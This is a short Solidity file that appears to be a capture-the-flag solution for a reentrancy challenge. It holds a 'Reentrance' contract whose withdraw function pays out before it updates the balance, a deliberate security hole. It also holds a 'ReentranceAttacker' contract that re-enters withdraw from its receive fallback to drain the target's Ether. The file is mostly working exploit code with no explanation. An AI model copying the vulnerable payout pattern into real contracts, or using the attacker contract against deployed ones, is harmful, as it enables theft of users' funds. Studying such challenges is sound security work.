// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../openzeppelin/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract ReentranceAttacker {
    Reentrance private reentrance;

    constructor(address payable _reentrance) public {
        reentrance = Reentrance(_reentrance);
    }

    function attack() public payable {
        reentrance.donate.value(msg.value)(address(this));
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        reentrance.withdraw(msg.value);
    }
}
